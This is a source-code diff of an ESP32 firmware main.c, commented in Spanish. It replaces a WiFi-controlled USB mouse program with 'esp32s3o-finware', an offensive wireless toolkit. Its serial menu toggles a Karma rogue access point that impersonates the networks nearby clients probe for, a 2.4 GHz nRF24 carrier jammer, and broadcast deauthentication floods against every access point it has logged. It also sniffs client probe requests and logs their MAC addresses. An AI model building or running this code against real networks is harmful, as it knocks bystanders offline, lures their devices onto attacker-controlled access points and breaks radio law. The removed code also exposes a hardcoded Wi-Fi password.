@@ -1,336 +1,378 @@
 /*
- * ESP32-S2 mini: mouse USB HID controlado por WiFi (UDP).
+ * main.c — arnes de demostracion de esp32s3o-finware
  *
- * Version con soporte de "drag" (boton sostenido) ademas de:
- *   M <dx> <dy>   -> mover el cursor en relativo (como un trackpad)
- *   CL            -> clic izquierdo (press + release)
- *   CR            -> clic derecho (press + release)
- *   S <pasos>     -> girar la rueda de scroll
- *   DN            -> mantener presionado el boton izquierdo (drag start)
- *   UP            -> soltar el boton izquierdo (drag end)
- *
- * Mientras el boton esta "abajo" (DN), los reportes de movimiento (M)
- * viajan con ese boton incluido en la mascara, tal como si mantuvieras
- * fisicamente presionado el click mientras mueves el mouse. Asi se
- * puede arrastrar iconos, hacer swipe para desbloquear pantalla, etc.
- *
- * IMPORTANTE - datos de tu red:
- *   SSID / password puestos abajo en WIFI_SSID / WIFI_PASS.
- *
- * En el CMakeLists.txt de este componente ("main"), REQUIRES debe
- * incluir al menos:
- *   REQUIRES esp_wifi esp_netif esp_event nvs_flash lwip tinyusb driver
+ *   s = estadisticas     k = karma on/off    j = jammer on/off
+ *   d = deauth todos     c = limpiar tabla   l = LED on/off   h = ayuda
  */
-
 #include <stdio.h>
 #include <string.h>
-#include <errno.h>
+#include <ctype.h>
+
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
+
 #include "esp_log.h"
-#include "esp_wifi.h"
+#include "esp_system.h"
+#include "esp_heap_caps.h"
+#include "esp_psram.h"
+#include "esp_timer.h"
+#include "nvs_flash.h"
 #include "esp_event.h"
 #include "esp_netif.h"
-#include "nvs_flash.h"
-#include "lwip/sockets.h"
-#include "lwip/netdb.h"
-#include "tinyusb.h"
-#include "class/hid/hid_device.h"
+#include "esp_wifi_types.h"
 
-static const char *TAG = "usb_hid_wifi_mouse";
+#include "rf_core.h"
+#include "karma.h"
+#include "nrf24.h"
+#include "nrf24_dual.h"
+#include "ws2812.h"
 
-/* ----------------- datos de tu red (hotspot del celular) ------------- */
-#define WIFI_SSID   "BMW"
-#define WIFI_PASS   "789012345"
-#define UDP_PORT    4242
+static const char *TAG = "finware";
 
-/* ----------------- Descriptores TinyUSB (mouse HID) -------------------- */
+/* ------------------------------------------------------------------ */
+/* PINES. Evita 26-37 (flash/PSRAM octal), 19/20 (USB), 43/44 (UART0). */
+/* ------------------------------------------------------------------ */
+#ifndef A_MOSI
+#define A_MOSI  11
+#define A_MISO  13
+#define A_SCLK  12
+#define A_CS    10
+#define A_CE     9
+#endif
 
-#define TUSB_DESC_TOTAL_LEN (TUD_CONFIG_DESC_LEN + TUD_HID_DESC_LEN)
+#ifndef B_MOSI
+#define B_MOSI  17
+#define B_MISO  16
+#define B_SCLK  15
+#define B_CS    14
+#define B_CE     8
+#endif
 
-static const uint8_t hid_report_descriptor[] = {
-    TUD_HID_REPORT_DESC_MOUSE()
-};
+/* ------------------------------------------------------------------ */
+/* LED de estado                                                      */
+/* ------------------------------------------------------------------ */
+typedef enum {
+    LED_OFF = 0,
+    LED_RAINBOW,       /* idle: ciclo lento              */
+    LED_KARMA,         /* rojo latiendo: karma activo    */
+    LED_JAM,           /* azul fijo: jammer emitiendo    */
+    LED_ATTACK,        /* verde latiendo: deauth enviado */
+    LED_BOOT,          /* destello blanco al arrancar    */
+} led_mode_t;
 
-static const char *hid_string_descriptor[5] = {
-    (char[]){0x09, 0x04},           // 0: idioma (ingles US)
-    "ESP32",                         // 1: fabricante
-    "ESP32-S2 Mouse WiFi",           // 2: producto
-    "123456",                        // 3: serial
-    "HID Interface",                 // 4: nombre del descriptor HID
-};
+static volatile int s_led_mode = LED_OFF;
+static volatile int s_led_on   = 1;
 
-static const uint8_t hid_configuration_descriptor[] = {
-    TUD_CONFIG_DESCRIPTOR(1, 1, 0, TUSB_DESC_TOTAL_LEN,
-                           TUSB_DESC_CONFIG_ATT_REMOTE_WAKEUP, 100),
-    TUD_HID_DESCRIPTOR(0, 4, false, sizeof(hid_report_descriptor), 0x81, 16, 10),
-};
-
-uint8_t const *tud_hid_descriptor_report_cb(uint8_t instance)
+static const char *mac2str(const uint8_t *m, char *buf)
 {
-    (void) instance;
-    return hid_report_descriptor;
+    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
+            m[0], m[1], m[2], m[3], m[4], m[5]);
+    return buf;
 }
 
-uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type,
-                                uint8_t *buffer, uint16_t reqlen)
+/* ------------------------------------------------------------------ */
+/* Tarea del LED: solo toca el LED. El estado lo fija la CLI.         */
+/* ------------------------------------------------------------------ */
+static void led_task(void *arg)
 {
-    (void) instance; (void) report_id; (void) report_type; (void) buffer; (void) reqlen;
-    return 0;
-}
+    (void)arg;
+    uint8_t pos = 0;
 
-void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id, hid_report_type_t report_type,
-                            uint8_t const *buffer, uint16_t bufsize)
-{
-    (void) instance; (void) report_id; (void) report_type; (void) buffer; (void) bufsize;
-}
-
-/* ----------------------------- WiFi STA ------------------------------- */
-
-static void wifi_event_handler(void *arg, esp_event_base_t event_base,
-                                int32_t event_id, void *event_data)
-{
-    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
-        esp_wifi_connect();
-    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
-        ESP_LOGW(TAG, "WiFi desconectado, reintentando conexion...");
-        esp_wifi_connect();
-    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
-        ip_event_got_ip_t *event = (ip_event_got_ip_t *) event_data;
-        ESP_LOGI(TAG, "IP obtenida: " IPSTR, IP2STR(&event->ip_info.ip));
-        ESP_LOGI(TAG, "(anota esta IP si el broadcast desde el celular no llega y necesitas fijarla en el script)");
-    }
-}
-
-static void wifi_init_sta(void)
-{
-    ESP_ERROR_CHECK(esp_netif_init());
-    ESP_ERROR_CHECK(esp_event_loop_create_default());
-    esp_netif_create_default_wifi_sta();
-
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
-
-    ESP_ERROR_CHECK(esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, NULL));
-    ESP_ERROR_CHECK(esp_event_handler_register(IP_EVENT, IP_EVENT_STA_GOT_IP, &wifi_event_handler, NULL));
-
-    wifi_config_t wifi_config = {
-        .sta = {
-            .ssid = WIFI_SSID,
-            .password = WIFI_PASS,
-            .threshold.authmode = WIFI_AUTH_WPA2_PSK,
-        },
-    };
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
-    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
-    ESP_ERROR_CHECK(esp_wifi_start());
-}
-
-/* ------------------------- Helpers mouse HID --------------------------- */
-
-/* Estado persistente del boton. Se usa para drag: mientras esta
-   "abajo" (DN), todos los reportes de movimiento salen con este
-   boton incluido en la mascara, como si lo tuvieras fisicamente
-   presionado mientras mueves el mouse. */
-static uint8_t s_button_mask = 0x00;
-
-static void hid_click(uint8_t button_mask)
-{
-    if (!tud_hid_ready()) {
-        return;
-    }
-    // clic rapido: no toca el estado persistente de drag, manda su
-    // propio press+release combinado con lo que ya estuviera sostenido
-    tud_hid_mouse_report(0, s_button_mask | button_mask, 0, 0, 0, 0);
-    vTaskDelay(pdMS_TO_TICKS(20));
-    tud_hid_mouse_report(0, s_button_mask, 0, 0, 0, 0);
-}
-
-static void hid_button_down(uint8_t button_mask)
-{
-    s_button_mask |= button_mask;
-    if (!tud_hid_ready()) {
-        return;
-    }
-    tud_hid_mouse_report(0, s_button_mask, 0, 0, 0, 0);
-}
-
-static void hid_button_up(uint8_t button_mask)
-{
-    s_button_mask &= (uint8_t)~button_mask;
-    if (!tud_hid_ready()) {
-        return;
-    }
-    tud_hid_mouse_report(0, s_button_mask, 0, 0, 0, 0);
-}
-
-static void hid_scroll(int steps)
-{
-    if (!tud_hid_ready()) {
-        return;
-    }
-    int8_t wheel = (int8_t)(steps > 127 ? 127 : (steps < -127 ? -127 : steps));
-    tud_hid_mouse_report(0, s_button_mask, 0, 0, wheel, 0);
-}
-
-static void hid_move(int dx, int dy)
-{
-    if (!tud_hid_ready()) {
-        return;
-    }
-    // Los reportes HID de mouse usan deltas de 1 byte (-127..127). Si
-    // llega un delta mas grande (por ejemplo por un swipe rapido),
-    // lo partimos en varios reportes en vez de recortarlo.
-    while (dx != 0 || dy != 0) {
-        int8_t step_x = (int8_t)(dx > 127 ? 127 : (dx < -127 ? -127 : dx));
-        int8_t step_y = (int8_t)(dy > 127 ? 127 : (dy < -127 ? -127 : dy));
-        // usamos s_button_mask en vez de 0x00: asi si hay un drag
-        // activo (DN mandado antes), el boton se mantiene presionado
-        // durante todo el movimiento
-        tud_hid_mouse_report(0, s_button_mask, step_x, step_y, 0, 0);
-        dx -= step_x;
-        dy -= step_y;
-        if (dx != 0 || dy != 0) {
-            vTaskDelay(pdMS_TO_TICKS(2));
-        }
-    }
-}
-
-/* --------------------- Tarea UDP: recibe comandos ----------------------- */
-
-static void udp_server_task(void *pvParameters)
-{
-    char rx_buffer[128];
-
-    struct sockaddr_in bind_addr;
-    bind_addr.sin_addr.s_addr = htonl(INADDR_ANY);
-    bind_addr.sin_family = AF_INET;
-    bind_addr.sin_port = htons(UDP_PORT);
-
-    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
-    if (sock < 0) {
-        ESP_LOGE(TAG, "No se pudo crear el socket UDP: errno %d", errno);
-        vTaskDelete(NULL);
-        return;
-    }
-
-    if (bind(sock, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0) {
-        ESP_LOGE(TAG, "No se pudo bindear el socket UDP: errno %d", errno);
-        close(sock);
-        vTaskDelete(NULL);
-        return;
-    }
-
-    ESP_LOGI(TAG, "Socket UDP escuchando en puerto %d", UDP_PORT);
-
-    while (1) {
-        struct sockaddr_in source_addr;
-        socklen_t socklen = sizeof(source_addr);
-        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0,
-                            (struct sockaddr *)&source_addr, &socklen);
-        if (len < 0) {
-            ESP_LOGE(TAG, "recvfrom fallo: errno %d", errno);
+    for (;;) {
+        int mode = s_led_mode;
+        if (!s_led_on || mode == LED_OFF) {
+            ws2812_off();
+            vTaskDelay(pdMS_TO_TICKS(120));
             continue;
         }
-        rx_buffer[len] = '\0';
 
-        int dx = 0, dy = 0, steps = 0;
-        if (rx_buffer[0] == 'M') {
-            if (sscanf(rx_buffer, "M %d %d", &dx, &dy) == 2) {
-                hid_move(dx, dy);
+        switch (mode) {
+        case LED_RAINBOW:
+            /* 1 paso cada 50 ms -> ciclo completo en ~13 s. Lento. */
+            ws2812_wheel(pos, (uint8_t[3]){0}, (uint8_t[3]){0}, (uint8_t[3]){0});
+            {
+                uint8_t r, g, b;
+                ws2812_wheel(pos, &r, &g, &b);
+                ws2812_set(r, g, b);
             }
-        } else if (rx_buffer[0] == 'S') {
-            if (sscanf(rx_buffer, "S %d", &steps) == 1) {
-                hid_scroll(steps);
-            }
-        } else if (strncmp(rx_buffer, "CL", 2) == 0) {
-            hid_click(0x01); // boton izquierdo (clic rapido)
-        } else if (strncmp(rx_buffer, "CR", 2) == 0) {
-            hid_click(0x02); // boton derecho (clic rapido)
-        } else if (strncmp(rx_buffer, "DN", 2) == 0) {
-            hid_button_down(0x01); // mantener boton izquierdo (drag start)
-        } else if (strncmp(rx_buffer, "UP", 2) == 0) {
-            hid_button_up(0x01);   // soltar boton izquierdo (drag end)
+            pos = (uint8_t)(pos + 1);
+            vTaskDelay(pdMS_TO_TICKS(50));
+            break;
+
+        case LED_KARMA: {
+            /* latido rojo */
+            uint8_t v = (uint8_t)((pos < 128) ? pos : (255 - pos));
+            ws2812_set(v, 0, 0);
+            pos = (uint8_t)(pos + 4);
+            vTaskDelay(pdMS_TO_TICKS(12));
+            break;
+        }
+
+        case LED_JAM:
+            ws2812_set(0, 0, 200);          /* azul fijo */
+            vTaskDelay(pdMS_TO_TICKS(150));
+            break;
+
+        case LED_ATTACK: {
+            /* destello verde, se apaga solo tras 4 ciclos */
+            static int n = 0;
+            ws2812_set(0, (uint8_t)((pos < 128) ? 255 : 0), 0);
+            pos = (uint8_t)(pos + 64);
+            if (++n >= 8) { n = 0; s_led_mode = LED_RAINBOW; }
+            vTaskDelay(pdMS_TO_TICKS(40));
+            break;
+        }
+
+        case LED_BOOT:
+            ws2812_set(255, 255, 255);
+            vTaskDelay(pdMS_TO_TICKS(120));
+            ws2812_off();
+            vTaskDelay(pdMS_TO_TICKS(120));
+            ws2812_set(255, 255, 255);
+            vTaskDelay(pdMS_TO_TICKS(120));
+            s_led_mode = LED_RAINBOW;
+            break;
+
+        default:
+            vTaskDelay(pdMS_TO_TICKS(100));
+            break;
         }
     }
 }
 
-/* --------------------------------- main --------------------------------- */
+/* ------------------------------------------------------------------ */
+/* Karma pide que reconvirtamos el softAP para completar la asociacion  */
+/* ------------------------------------------------------------------ */
+static void on_karma_auth(const char *ssid, uint8_t chan)
+{
+    wifi_config_t ap;
+    if (esp_wifi_get_config(WIFI_IF_AP, &ap) != ESP_OK) return;
 
-#include <math.h>
-#include "esp_err.h"
-#include "freertos/FreeRTOS.h"
-#include "freertos/task.h"
-#include "led_strip.h"
+    size_t n = strlen(ssid);
+    if (n > 31) n = 31;
+    memset(ap.ap.ssid, 0, sizeof(ap.ap.ssid));
+    memcpy(ap.ap.ssid, ssid, n);
+    ap.ap.ssid_len       = (uint8_t)n;
+    ap.ap.channel        = chan;
+    ap.ap.max_connection = 4;
+    ap.ap.authmode       = WIFI_AUTH_OPEN;
 
-#define LED_GPIO   48
-#define LED_BRIGHT 50   // 0-255
-
-static void rainbow_task(void *arg) {
-    led_strip_handle_t strip;
-    led_strip_config_t cfg = {
-        .strip_gpio_num = LED_GPIO,
-        .max_leds = 1,
-        .led_model = LED_MODEL_WS2812,
-        .led_pixel_format = LED_PIXEL_FORMAT_GRB,
-    };
-    led_strip_rmt_config_t rmt = {
-        .clk_src = RMT_CLK_SRC_DEFAULT,
-        .resolution_hz = 10 * 1000 * 1000,
-    };
-    ESP_ERROR_CHECK(led_strip_new_rmt_device(&cfg, &rmt, &strip));
-
-    float hue = 0;
-    while (1) {
-        float x = hue / 60.0f, f = x - floorf(x), q = 1 - f;
-        float r, g, b;
-        switch ((int)x % 6) {
-            case 0: r = 1; g = f; b = 0; break;
-            case 1: r = q; g = 1; b = 0; break;
-            case 2: r = 0; g = 1; b = f; break;
-            case 3: r = 0; g = q; b = 1; break;
-            case 4: r = f; g = 0; b = 1; break;
-            default: r = 1; g = 0; b = q; break;
-        }
-        led_strip_set_pixel(strip, 0,
-            (uint8_t)(powf(r, 2.2f) * LED_BRIGHT + 0.5f),
-            (uint8_t)(powf(g, 2.2f) * LED_BRIGHT + 0.5f),
-            (uint8_t)(powf(b, 2.2f) * LED_BRIGHT + 0.5f));
-        led_strip_refresh(strip);
-        hue += 0.5f;
-        if (hue >= 360) hue -= 360;
-        vTaskDelay(pdMS_TO_TICKS(25));
+    if (esp_wifi_set_config(WIFI_IF_AP, &ap) == ESP_OK) {
+        ESP_LOGW(TAG, "softAP -> '%s' ch%d: el cliente completara la asociacion",
+                 ssid, chan);
     }
 }
 
+/* ------------------------------------------------------------------ */
+/* Consumidor de tramas Wi-Fi: core 1. Alimenta a Karma.               */
+/* ------------------------------------------------------------------ */
+static void on_frame(const rf_frame_t *f, void *user)
+{
+    (void)user;
+    rf_mgmt_info_t m;
+
+    if (!rf_parse_mgmt(f, &m)) return;
+    karma_feed(&m);
+
+    if (m.subtype == RF_SUB_BEACON) {
+        rf_ap_entry_t *ap = rf_ap_upsert(&m);
+        if (ap != NULL && ap->beacons == 1u) {
+            char b[18];
+            ESP_LOGI(TAG, "AP   %s  ch%-2d  %4d dBm  %-3s '%s'",
+                     mac2str(m.bssid, b), m.chan, m.rssi,
+                     ap->wpa2 ? "WPA" : "OPN", ap->ssid);
+        }
+    } else if (m.subtype == RF_SUB_PROBE_REQ && m.ssid_len > 0) {
+        char b[18];
+        ESP_LOGI(TAG, "PROBE %s busca '%s'", mac2str(m.transmitter, b), m.ssid);
+    }
+}
+
+/* ------------------------------------------------------------------ */
+static void stats_task(void *arg)
+{
+    (void)arg;
+    for (;;) {
+        vTaskDelay(pdMS_TO_TICKS(4000));
+        rf_stats_t s = rf_stats();
+        ESP_LOGI(TAG, "rx=%u drop=%u parsed=%u ap=%u tx_ok=%u tx_fail=%u hops=%u karma=%u",
+                 s.rx_total, s.rx_dropped, s.rx_parsed, rf_ap_count(),
+                 s.tx_ok, s.tx_fail, s.hopper_hops, karma_target_count());
+    }
+}
+
+/* ------------------------------------------------------------------ */
+/* Barrido dual de espectro: los dos modulos a la vez, cores distintos */
+/* ------------------------------------------------------------------ */
+static void spectrum_task(void *arg)
+{
+    (void)arg;
+    nrf_dual_result_t r;
+
+    for (;;) {
+        vTaskDelay(pdMS_TO_TICKS(700));
+
+        nrf24_dual_sweep_async();
+        while (!nrf24_dual_sweep_done()) {
+            vTaskDelay(pdMS_TO_TICKS(1));
+        }
+        nrf24_dual_result(&r);
+
+        char line[160];
+        size_t o = 0;
+        o += (size_t)snprintf(line + o, sizeof(line) - o, "2.4G[%uus,%uhit]: ",
+                              r.sweep_us, r.hits);
+        for (uint32_t ch = 0; ch < NRF_DUAL_CHANNELS; ch += 4) {
+            uint32_t hit = r.rpd[ch] | r.rpd[ch + 1] | r.rpd[ch + 2] | r.rpd[ch + 3];
+            o += (size_t)snprintf(line + o, sizeof(line) - o, "%s", hit ? "#" : ".");
+        }
+        ESP_LOGI(TAG, "%s", line);
+    }
+}
+
+/* ------------------------------------------------------------------ */
+static bool deauth_cb(const rf_ap_entry_t *e, void *user)
+{
+    (void)user;
+    char b[18];
+    rf_set_channel(e->chan, WIFI_SECOND_CHAN_NONE);
+    for (int i = 0; i < 8; i++) {
+        rf_deauth_bcast(e->bssid, 7);          /* reason 7: class 3 frame */
+        vTaskDelay(pdMS_TO_TICKS(2));
+    }
+    ESP_LOGW(TAG, "deauth -> %s '%s' (ch%d)", mac2str(e->bssid, b), e->ssid, e->chan);
+    return true;
+}
+
+/* ------------------------------------------------------------------ */
+static int s_karma_on;
+static int s_jammer_on;
+
+static void cli_task(void *arg)
+{
+    (void)arg;
+    int c;
+
+    for (;;) {
+        c = getchar();
+        if (c == EOF) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+            continue;
+        }
+
+        switch (tolower(c)) {
+        case 's': {
+            rf_stats_t s = rf_stats();
+            ESP_LOGI(TAG, "rx=%u drop=%u parsed=%u ap=%u tx_ok=%u tx_fail=%u hops=%u karma=%u",
+                     s.rx_total, s.rx_dropped, s.rx_parsed, rf_ap_count(),
+                     s.tx_ok, s.tx_fail, s.hopper_hops, karma_target_count());
+            break;
+        }
+        case 'k':
+            s_karma_on = !s_karma_on;
+            if (s_karma_on) {
+                karma_start();
+                s_led_mode = LED_KARMA;
+            } else {
+                karma_stop();
+                rf_hop_start(120, 1, 14);
+                s_led_mode = LED_RAINBOW;
+            }
+            ESP_LOGW(TAG, "karma %s", s_karma_on ? "ON" : "OFF");
+            break;
+
+        case 'j':
+            s_jammer_on = !s_jammer_on;
+            if (s_jammer_on) {
+                nrf24_carrier(nrf24_dual_b(), 40);   /* centro de 2.4 GHz */
+                s_led_mode = LED_JAM;
+                ESP_LOGW(TAG, "jammer ON (modulo B, ch40)");
+            } else {
+                nrf24_carrier_stop(nrf24_dual_b());
+                s_led_mode = LED_RAINBOW;
+                ESP_LOGW(TAG, "jammer OFF");
+            }
+            break;
+
+        case 'd':
+            if (rf_ap_count() == 0) {
+                ESP_LOGW(TAG, "tabla vacia");
+            } else {
+                ESP_LOGW(TAG, "atacando %u AP(s)", rf_ap_count());
+                s_led_mode = LED_ATTACK;
+                rf_ap_iterate(deauth_cb, NULL);
+            }
+            break;
+
+        case 'c':
+            rf_ap_clear();
+            ESP_LOGI(TAG, "tabla limpiada");
+            break;
+
+        case 'l':
+            s_led_on = !s_led_on;
+            ESP_LOGI(TAG, "LED %s", s_led_on ? "ON" : "OFF");
+            break;
+
+        case 'h':
+            ESP_LOGI(TAG, "s=stats k=karma j=jammer d=deauth c=limpiar l=led h=ayuda");
+            break;
+
+        default: break;
+        }
+    }
+}
+
+/* ------------------------------------------------------------------ */
 void app_main(void)
 {
-    xTaskCreate(rainbow_task, "rainbow", 4096, NULL, 1, NULL);
-    ESP_LOGI(TAG, "Inicializando NVS...");
-    esp_err_t ret = nvs_flash_init();
-    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
+    esp_err_t e = nvs_flash_init();
+    if (e == ESP_ERR_NVS_NO_FREE_PAGES || e == ESP_ERR_NVS_NEW_VERSION_FOUND) {
         ESP_ERROR_CHECK(nvs_flash_erase());
-        ret = nvs_flash_init();
+        e = nvs_flash_init();
     }
-    ESP_ERROR_CHECK(ret);
+    ESP_ERROR_CHECK(e);
 
-    ESP_LOGI(TAG, "Inicializando USB HID mouse...");
-    const tinyusb_config_t tusb_cfg = {
-        .device_descriptor = NULL,
-        .string_descriptor = hid_string_descriptor,
-        .string_descriptor_count = sizeof(hid_string_descriptor) / sizeof(hid_string_descriptor[0]),
-        .external_phy = false,
-        .configuration_descriptor = hid_configuration_descriptor,
-    };
-    ESP_ERROR_CHECK(tinyusb_driver_install(&tusb_cfg));
+    ESP_ERROR_CHECK(esp_netif_init());
+    ESP_ERROR_CHECK(esp_event_loop_create_default());
 
-    ESP_LOGI(TAG, "Conectando WiFi a SSID '%s'...", WIFI_SSID);
-    wifi_init_sta();
+    ESP_LOGI(TAG, "esp32s3o-finware | IDF %s", esp_get_idf_version());
+    ESP_LOGI(TAG, "PSRAM: %u KB",
+             (unsigned)(heap_caps_get_total_size(MALLOC_CAP_SPIRAM) / 1024));
 
-    xTaskCreate(udp_server_task, "udp_server", 4096, NULL, 5, NULL);
+    /* ---- nucleo de radio Wi-Fi ---- */
+    ESP_ERROR_CHECK(rf_core_init());
+    ESP_ERROR_CHECK(rf_ap_table_init());
+    ESP_ERROR_CHECK(rf_core_start());
+    rf_sniffer_attach(on_frame, NULL);
+    ESP_ERROR_CHECK(rf_hop_start(120, 1, 14));
 
-    ESP_LOGI(TAG, "Listo. Conecta el S2 mini por USB a la tablet.");
-    ESP_LOGI(TAG, "Esperando comandos por WiFi UDP en el puerto %d.", UDP_PORT);
-    ESP_LOGI(TAG, "Comandos: M dx dy | CL | CR | S pasos | DN (drag start) | UP (drag end)");
+    /* ---- karma ---- */
+    ESP_ERROR_CHECK(karma_init());
+    karma_set_auth_cb(on_karma_auth);
+
+    /* ---- doble nRF24 ---- */
+    nrf24_cfg_t ca = { .host = SPI2_HOST, .mosi = A_MOSI, .miso = A_MISO,
+                       .sclk = A_SCLK, .cs = A_CS, .ce = A_CE };
+    nrf24_cfg_t cb = { .host = SPI3_HOST, .mosi = B_MOSI, .miso = B_MISO,
+                       .sclk = B_SCLK, .cs = B_CS, .ce = B_CE };
+    bool nrf_ok = (nrf24_dual_init(&ca, &cb) == ESP_OK);
+    if (nrf_ok) {
+        xTaskCreatePinnedToCore(spectrum_task, "spec", 4096, NULL, 3, NULL, 1);
+    } else {
+        ESP_LOGE(TAG, "doble nRF24 no arranco: revisa pines y alimentacion");
+    }
+
+    xTaskCreatePinnedToCore(stats_task, "stats", 4096, NULL, 3, NULL, 1);
+    xTaskCreatePinnedToCore(cli_task,   "cli",   4096, NULL, 2, NULL, 1);
+
+    /* ---- LED RGB: lo ultimo, cuando todo ya corre ---- */
+    if (ws2812_init(WS2812_GPIO) == ESP_OK) {
+        s_led_mode = LED_BOOT;                 /* destello blanco */
+        xTaskCreatePinnedToCore(led_task, "led", 4096, NULL, 1, NULL, 1);
+    } else {
+        ESP_LOGW(TAG, "LED RGB no disponible en GPIO%d", WS2812_GPIO);
+    }
+
+    ESP_LOGI(TAG, "listo. 'h' para ayuda.");
 }
-
